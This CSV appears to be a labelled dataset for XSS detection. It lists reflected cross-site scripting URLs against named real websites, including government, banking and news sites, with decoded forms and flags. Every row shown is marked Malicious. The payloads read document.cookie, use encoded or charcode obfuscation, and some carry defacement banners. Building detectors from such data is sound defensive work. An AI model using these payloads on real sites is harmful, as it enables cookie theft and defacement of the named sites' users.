Payloads,Class,decoded,executed,parser_changed
http://icsouthlondon.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.<br>org/)%3c/script%3e%3cp,Malicious,"http://icsouthlondon.icnetwork.co.uk/search.cfm?query=""><script>alert(/xss - thedefaced.org/)</script><p",True,True
https://ab-dep-op-elogbook.web.cern.ch/ab-dep-op-elogbook/elogbook/elogbook.php?lgbk=110&amp;date=');%3e<br>%3cscript%3ealert(1);%3c/script%3e&amp;shift=1,Malicious,https://ab-dep-op-elogbook.web.cern.ch/ab-dep-op-elogbook/elogbook/elogbook.php?lgbk=110&date=');><script>alert(1);</script>&shift=1,True,True
http://bbs.kabubu.net/2ch/test/search.cgi?bbs=c%00%22%22%3cscript%3ealert('xss');%3c/script%3e&amp;keywo<br>rd=,Malicious,http://bbs.kabubu.net/2ch/test/search.cgi?bbs=c,True,True
http://www.dygs.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious,"http://www.dygs.gov.cn:6080/badlogin.php?tid=0&lid=""><script>alert(document.cookie)</script><p ",True,True
http://asc-hq.sourceforge.net/show.php?id=58%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,http://asc-hq.sourceforge.net/show.php?id=58<script>alert(document.cookie)</script>,True,True
http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-list/%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious,"http://blade.nagaokaut.ac.jp/cgi-bin/scat.rb/ruby/ruby-list/"">'><script>alert(""xss by kusomiso.com"")</script>><marquee><h1>by kusomiso.com</h1></marquee>",True,True
"http://www.theage.com.au/action/iframeratingfeedback?assetid=1,998,178&amp;headcomponenttemplatelocation<br>=tvpresenter%22/%3e%3cscript%3ealert%281%29;%3c/script%3e",Malicious,"http://www.theage.com.au/action/iframeratingfeedback?assetid=1,998,178&headcomponenttemplatelocation=tvpresenter""/><script>alert(1);</script>",True,True
http://www.atv.com.tr/video/bolumler.php?dizi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.atv.com.tr/video/bolumler.php?dizi=""><script>alert(document.cookie)</script>",True,True
http://homepage.naver.com/browse/search.php?where=keyword&amp;keyword=%22%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e,Malicious,"http://homepage.naver.com/browse/search.php?where=keyword&keyword=""><script>alert(1)</script>",True,True
http://www.ectswsr.com.au/register.php?id=24%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,"http://www.ectswsr.com.au/register.php?id=24""><script>alert(document.cookie);</script>",True,True
http://pbwiki.com/help.php?wiki=twitterapi%22%3e%3cimg/src/onerror=alert(0)%3e,Malicious,"http://pbwiki.com/help.php?wiki=twitterapi""><img/src/onerror=alert(0)>",True,True
http://wdfw.wa.gov/do/newreal/release.php?id=feb2404a'test&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://wdfw.wa.gov/do/newreal/release.php?id=feb2404a'test""></a><script>alert(1);</script>",True,True
http://www.ridgemarchingband.org/mgallery/index.php?c=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.ridgemarchingband.org/mgallery/index.php?c=""><script>alert(document.cookie)</script>",True,True
http://www.depeche-mode.it/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.depeche-mode.it/igallery34/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.livedeal.ca/index.jsp?locale=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.livedeal.ca/index.jsp?locale=""><script>alert(""maxwel"")</script>",True,True
http://modern-empires.ej.am/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://modern-empires.ej.am/register.php?ref='><script>alert(document.cookie);</script>,True,True
http://pt.888.com/site2/poker/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://pt.888.com/site2/poker/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://www.vogue.de/suche/1/0/0/%2522%253e%253cscript%253ealert%2528%2522xss%2522%2529%253c%252fscri<br>pt%253e,Malicious,"http://www.vogue.de/suche/1/0/0/""><script>alert(""xss"")</script>",True,True
http://www.race4clicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.race4clicks.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
http://search.geocomm.com/search.phtml?query=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://search.geocomm.com/search.phtml?query=""><script>alert(""maxwel"")</script>",True,True
http://www.neopets.com/guilds/preview_guild.phtml?guild_bgcolor=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious,"http://www.neopets.com/guilds/preview_guild.phtml?guild_bgcolor=""><script>alert(document.cookie)</script>",True,True
http://www.zetyem.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.zetyem.com/default.asp?gb=urun&id=293&ortak=""><script>alert(""backdoor"")</script>",True,True
http://www.szboftec.gov.cn/download/test.php3?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,http://www.szboftec.gov.cn/download/test.php3?a[]=<script>alert(/xssed_by_omeha/);</script><script>alert(document.cookie);</script>,True,True
http://www.animenewsnetwork.com/encyclopedia/people.php?id=4599+order+by+1--%3cscript%3ealert(/xss/)<br>%3c/script%3e,Malicious,http://www.animenewsnetwork.com/encyclopedia/people.php?id=4599 order by 1--<script>alert(/xss/)</script>,True,True
http://www.yeahbutno.com/mats/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yeahbutno.com/mats/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.sevillafc.es/_www/participa.php?op=result&amp;pollid=146&quot;&gt;&lt;script&gt;alert(/fenerbahce/)&lt;/script<br>&gt;,Malicious,"http://www.sevillafc.es/_www/participa.php?op=result&pollid=146""><script>alert(/fenerbahce/)</script>",True,True
http://www.amonline.net.au/search.cfm?searchstring=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.amonline.net.au/search.cfm?searchstring=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.filmfederacja.pl/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cooki<br>e);%3c/script%3e,Malicious,http://www.filmfederacja.pl/includes/phpthumb.php?originalimagedata=<script>alert(document.cookie);</script>,True,True
"<base href=""javascript:javascript:alert(1);//"">",Malicious,"<base href=""javascript:javascript:alert(1);//"">",True,True
http://u-dvd.mgf5.com/ranklink186/ranklink.cgi?id=%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,http://u-dvd.mgf5.com/ranklink186/ranklink.cgi?id=<script>alert(/xss/)</script>,True,True
http://tenebrae.sourceforge.net/index.php?page=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://tenebrae.sourceforge.net/index.php?page=""><script>alert(1)</script>",True,True
https://www.speedtest.net/user-login.php?referrer=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"https://www.speedtest.net/user-login.php?referrer=""><script>alert(document.cookie)</script>",True,True
http://www.filmsdistribution.com/fd_library_title.php?id_search=3/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.filmsdistribution.com/fd_library_title.php?id_search=3/""><script>alert(1)</script>",True,True
http://www.lons-zoom.fr/index.php?rech-site=&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;submit.x=14&amp;submit.y=9&amp;act=rechercher,Malicious,"http://www.lons-zoom.fr/index.php?rech-site=""><script>alert('xss byatm0n3r')</script>&submit.x=14&submit.y=9&act=rechercher",True,True
http://www.casey.vic.gov.au/search/search.asp?showadvanced=true&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious,"http://www.casey.vic.gov.au/search/search.asp?showadvanced=true""><script>alert(""bluemax"")</script>",True,True
http://www.multiply.com/&quot;&gt;&lt;script&gt;alert(&quot;xss found by rugburn&quot;)&lt;/script&gt;,Malicious,"http://www.multiply.com/""><script>alert(""xss found by rugburn"")</script>",True,True
http://www.co.delaware.in.us/egov/apps/document/center.egov?fdd=21-149%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.co.delaware.in.us/egov/apps/document/center.egov?fdd=21-149'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://bin.cakephp.org/search?q=%22%3e%3ciframe%20src=javascript:alert(/xss/)%3e&amp;search=search,Malicious,"http://bin.cakephp.org/search?q=""><iframe src=javascript:alert(/xss/)>&search=search",True,True
http://www.ptcl.com.pk/searchall.php?key=%22%3e%3cscript%3ealert%28%27pakistan+telecommunication+lim<br>ited+pwned+by+neo+gurus%27%29%3c%2fscript%3e%3cimg+src%3d%22http%3a%2f%2fimg149.imageshack.us%2fimg1<br>49%2f1232%2flogonj5.gif%22%3e%3c,Malicious,"http://www.ptcl.com.pk/searchall.php?key=""><script>alert('pakistan telecommunication limited pwned by neo gurus')</script><img src=""http://img149.imageshack.us/img149/1232/logonj5.gif""><",True,True
http://barmafia.free.fr/dlm/download.php?id=363/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://barmafia.free.fr/dlm/download.php?id=363/""><script>alert(1)</script>",True,True
http://de.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious,"http://de.888.com/new888/home.htm?page=gettingstarted&lang=""><script>alert(document.cookie)</script>",True,True
https://wist.echo.nasa.gov/api//u69370/u69375%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br>3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol,Malicious,"https://wist.echo.nasa.gov/api//u69370/u69375'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol",True,True
http://www.fiferightsforum.org.uk/layout/bespoke_perfquestions/datepopup.cfm?formname=&quot;&gt;&lt;script&gt;aler<br>t(&quot;cyber-warrior.org&quot;)&lt;/script&gt;,Malicious,"http://www.fiferightsforum.org.uk/layout/bespoke_perfquestions/datepopup.cfm?formname=""><script>alert(""cyber-warrior.org"")</script>",True,True
http://fastfindindex.com/search.php?q=&lt;/title&gt;&lt;/head&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/html&gt;,Malicious,http://fastfindindex.com/search.php?q=</title></head><script>alert(document.cookie)</script></html>,True,True
http://www.cdpac.ca/content.php?doc=107&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.cdpac.ca/content.php?doc=107""><script>alert(document.cookie)</script>",True,True
http://www.gametrailers.com/umlisting.php?list=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.gametrailers.com/umlisting.php?list=""><script>alert(document.cookie);</script>",True,True
http://www2.miempresa.gob.pe/compras_estatales/detalle_convocatoria_his.php?c=08/0187028_0002_03}%3c<br>/style%3e%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%2<br>0xylitol%3c/h1%3e%3c/marquee%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious,"http://www2.miempresa.gob.pe/compras_estatales/detalle_convocatoria_his.php?c=08/0187028_0002_03}</style>'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee><script>a=eval;b=alert;a(b(/xss/.source));</script>",True,True
http://www.thegreysanatomywiki.com/account/&gt;&lt;script&gt;alert(&quot;xss by azat&quot;)&lt;%2fscript&gt;,Malicious,"http://www.thegreysanatomywiki.com/account/><script>alert(""xss by azat"")</script>",True,True
http://www.tni.mil.id/news.php?cid=%27%20%27%22%3e%3c/title%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://www.tni.mil.id/news.php?cid=' '""></title><script>alert(1)</script>",True,True
http://ads.tripod.lycos.co.uk/ad/google/frame.php?_url=%3c/script%3e%3cscript%3ealert(document.cooki<br>e)%3c/script%3e,Malicious,http://ads.tripod.lycos.co.uk/ad/google/frame.php?_url=</script><script>alert(document.cookie)</script>,True,True
http://www2.gep.mtss.gov.pt/docbweb/pesqres.asp?startrec=0&amp;base=web&amp;form=comp&amp;recpag=5&amp;searchtxt=&quot;&gt;&lt;<br>script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www2.gep.mtss.gov.pt/docbweb/pesqres.asp?startrec=0&base=web&form=comp&recpag=5&searchtxt=""><script>alert(document.cookie)</script>",True,True
"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>",Malicious,"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>",True,True
http://csc.lexum.umontreal.ca/scc-eliisa/?language=f%20%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss<br>%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e<br>r&amp;documentscope=judgment&amp;documentscope=news&amp;documentscope=bulletin&amp;all=+%27%22%3e%3c%2ftitle%3e%3csc<br>ript%3ealert(%22xss%22)%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+by+xylitol%3c%<br>2fh1%3e%3c%2fmarquee%3e,Malicious,"http://csc.lexum.umontreal.ca/scc-eliisa/?language=f '""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>r&documentscope=judgment&documentscope=news&documentscope=bulletin&all= '""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
<script>javascript:alert(1)</script>,Malicious,<script>javascript:alert(1)</script>,True,True
http://www.bursa-gumushaneliler.com/galery/login.asp?folder=http://www.ercmakina.com/galeri/login.as<br>p?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.bursa-gumushaneliler.com/galery/login.asp?folder=http://www.ercmakina.com/galeri/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://54.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://54.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.gangengagement.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.gangengagement.com/register.php?ref='><script>alert(document.cookie);</script>,True,True
https://infinity.icicibank.co.in/icici_search/app.jsp?normal=%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&site=default_collection&client=icadv&output=xml_no_dtd&proxystylesheet=icadv&proxycustom=%253chome%2f%253e&advance_action=not_adv_search,Malicious,https://infinity.icicibank.co.in/icici_search/app.jsp?normal=<script>alert('xss');</script>&site=default_collection&client=icadv&output=xml_no_dtd&proxystylesheet=icadv&proxycustom=<home/>&advance_action=not_adv_search,True,True
http://zpravy.idnes.cz/kdo-ma-platit-u-lekare-vladni-politici-se-prou-fah-/domaci.asp?c=%22%3e%3cscr<br>ipt%3ealert('by%20encore')%3c/script%3e,Malicious,"http://zpravy.idnes.cz/kdo-ma-platit-u-lekare-vladni-politici-se-prou-fah-/domaci.asp?c=""><script>alert('by encore')</script>",True,True
http://www.dazzleindough.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious,"http://www.dazzleindough.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
http://www.bogazyayla.com/galeri/login.asp?n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.bogazyayla.com/galeri/login.asp?n=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.reverso.net/text_translation.asp?lang=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://www.reverso.net/text_translation.asp?lang=""><script>alert(/xss/)</script>",True,True
http://www.arama.com/search.php3?q=&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,http://www.arama.com/search.php3?q=<script>alert('xss')</script>,True,True
http://www.cbsnews.com/stories/2005/09/26/search/main886284.shtml?num=10&amp;offset=0&amp;source=story&amp;secti<br>on=&amp;type=all&amp;sort=1&amp;searchstring=%3cscript%3ealert%28%27xxsed+by+i-l%e2ndet+from+turkiye+%21%21%21+%<br>27%29%3c%2fscript%3e&amp;x=32&amp;y=5,Malicious,http://www.cbsnews.com/stories/2005/09/26/search/main886284.shtml?num=10&offset=0&source=story§ion=&type=all&sort=1&searchstring=<script>alert('xxsed by i-l�ndet from turkiye !!! ')</script>&x=32&y=5,True,True
http://www.umcsummit.com/photogallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.umcsummit.com/photogallery/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://cgi.tbs.co.jp/bbs/bbsreception?contentsid=kameda-boxing&amp;bbsid=keijiban&amp;carrierid=web&amp;cmd=comm<br>it&amp;handle=%3c/script%3e%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%6<br>6%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35<br>%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%<br>39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://cgi.tbs.co.jp/bbs/bbsreception?contentsid=kameda-boxing&bbsid=keijiban&carrierid=web&cmd=commit&handle=</script>"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.ruvr.ru/index.php?lng=pek&amp;w=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://www.ruvr.ru/index.php?lng=pek&w=""><script>alert(/xss/)</script>",True,True
http://www.vazgectimsenden.com/tum_yazilar.asp?cat_id=19&amp;parent_id=10&amp;baslik=cinsellik&amp;alt_baslik=ci<br>nsel+hastal%fdklar&lt;script&gt;alert(&quot;cyber_thief(turkey)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious,"http://www.vazgectimsenden.com/tum_yazilar.asp?cat_id=19&parent_id=10&baslik=cinsellik&alt_baslik=cinsel hastal�klar<script>alert(""cyber_thief(turkey) hackhaber.com"")</script>",True,True
http://www.minefe.gouv.fr/recherche/lance_recherche.php?mot=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2<br>fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;search_go=ok,Malicious,http://www.minefe.gouv.fr/recherche/lance_recherche.php?mot=<script>alert(/zeryus/)</script><marquee><h1>xss by zeryus </h1></marquee>&search_go=ok,True,True
http://www.fazenda.rj.gov.br/busca/resultado.jsp?pagina=1&amp;breadcrumb=&amp;query=%22%3e%3cscript%3ealert(<br>'xssed')%3c/script%3e,Malicious,"http://www.fazenda.rj.gov.br/busca/resultado.jsp?pagina=1&breadcrumb=&query=""><script>alert('xssed')</script>",True,True
http://www.dokummakina.com.tr/index.php?module=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%<br>3b%3c/script%3e,Malicious,"http://www.dokummakina.com.tr/index.php?module=>""><script 
>alert(document.cookie);</script>",True,True
http://otomobil.tnn.net/modelgoster.asp?make_id=&quot;&gt;&lt;script&gt;alert(&quot;cyber//ferda-forever&quot;)&lt;/script&gt;,Malicious,"http://otomobil.tnn.net/modelgoster.asp?make_id=""><script>alert(""cyber//ferda-forever"")</script>",True,True
http://www.cinciva.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.cinciva.com/igallery34/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.netcomponents.com/ja/results.htm?r=1&amp;t=f&amp;src=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%6<br>5%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c<br>%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%<br>36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;so=&amp;d=1&amp;pn1=u@@@@@@@@@@@,Malicious,"http://www.netcomponents.com/ja/results.htm?r=1&t=f&src="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&so=&d=1&pn1=u@@@@@@@@@@@",True,True
http://www.ua.ac.be/main.aspx?c=*vacatures&amp;n=&quot;'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.ua.ac.be/main.aspx?c=*vacatures&n=""'><script>alert(document.cookie);</script>",True,True
http://search.nlm.nih.gov/medlineplus/query?disambiguation=true&amp;function=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&amp;oref=slogin,Malicious,"http://search.nlm.nih.gov/medlineplus/query?disambiguation=true&function=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>&oref=slogin",True,True
http://meta.buscape.com.br/cgi-bin/sinonimos/sinonimos_maglu.cgi?produto=%3cscript%3ealert%28666%29%<br>3c%2fscript%3e,Malicious,http://meta.buscape.com.br/cgi-bin/sinonimos/sinonimos_maglu.cgi?produto=<script>alert(666)</script>,True,True
http://www.unterwasserrugby.org/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;x<br>ssedbycicosz&quot;)&lt;/script&gt;,Malicious,"http://www.unterwasserrugby.org/members.asp?mode=search&m_name=g&initial=1&method=""><script>alert(""xssedbycicosz"")</script>",True,True
http://ms115.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms115.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.senat.cz/volby/jsv-eng.php?ke_dni=&amp;o=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.senat.cz/volby/jsv-eng.php?ke_dni=&o=""><script>alert(document.cookie)</script>",True,True
http://www.avg.co.uk/%22%3e%27%3e%3cscript%3ealert(/xss%20by%20mygot_manoel/)%3c/script%3e,Malicious,"http://www.avg.co.uk/"">'><script>alert(/xss by mygot_manoel/)</script>",True,True
http://www.crim.ca/fr/membres/zone_reserve/index.html?action=login&amp;password=1&amp;requestedresource=&lt;/te<br>xtarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;username=1,Malicious,"http://www.crim.ca/fr/membres/zone_reserve/index.html?action=login&password=1&requestedresource=</textarea>'""><script>alert(document.cookie)</script>&username=1",True,True
http://www.inndir.com/ara.php?ara=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.inndir.com/ara.php?ara=""><script>alert(document.cookie)</script>",True,True
http://www.blackberry.com/btsc/microsites/searchentry.do?&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.blackberry.com/btsc/microsites/searchentry.do?""><script>alert(document.cookie)</script>",True,True
http://www.yehhu.com/arama/arama.asp?q=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.yehhu.com/arama/arama.asp?q=""><script>alert(""maxwel"")</script>",True,True
http://www.siirinrengi.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssedb<br>ycicosz&quot;)&lt;/script&gt;,Malicious,"http://www.siirinrengi.com/members.asp?mode=search&m_name=g&initial=1&method=""><script>alert(""xssedbycicosz"")</script>",True,True
http://www.evrensel.net/kultur.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious,"http://www.evrensel.net/kultur.php?txt_arsiv_tarihi=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>.com",True,True
http://www.jouwnieuws.nl/%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://www.jouwnieuws.nl/""><script>alert(""xss"")</script>",True,True
http://www.zappos.com/n/bl/l/z/c/all/type/all.html?zv=201%27%22%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious,"http://www.zappos.com/n/bl/l/z/c/all/type/all.html?zv=201'""><script>alert(document.cookie)</script>",True,True
http://myschool.in.com/search/%3cscript%3ealert%28/xss%20by%2003storic/%29%3c/script%3e/1,Malicious,http://myschool.in.com/search/<script>alert(/xss by 03storic/)</script>/1,True,True
http://www.govexec.com/calendar/?mode=insertform%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.govexec.com/calendar/?mode=insertform""><script>alert(document.cookie)</script>""><script>alert(document.cookie)</script>",True,True
